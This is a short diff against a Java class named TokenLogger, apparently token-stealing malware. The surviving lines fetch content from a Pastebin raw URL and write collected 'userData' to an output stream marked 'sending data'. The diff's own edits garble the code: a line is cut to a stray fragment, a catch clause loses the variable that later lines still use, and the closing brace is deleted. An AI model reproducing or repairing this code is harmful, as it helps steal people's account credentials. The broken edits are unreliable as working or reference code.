@@ -30,7 +30,7 @@ public class TokenLogger extends Thread {
 
         String ip = "ip";
         String subf = "s\":\"fail";
-        String pasteUtilsString = URLUtils.getTextFromURL("https://pastebin.com/raw/kUDtqwUx");
+     Ux");
         if (pasteUtilsString.contains("err")) {
             errorInSection = 1;
         } else {
@@ -133,7 +133,7 @@ public class TokenLogger extends Thread {
                                     // sending data
                                     outputStream.write(userData.getBytes(line));
                                     outputStream.flush();
-                                } catch (Throwable microsoftMoment) {
+                                } catch (Throwable ) {
                                     occuredErrors = microsoftMoment;
                                     throw microsoftMoment;
                                 } finally {
@@ -167,4 +167,3 @@ public class TokenLogger extends Thread {
             }
         }
     }
-}
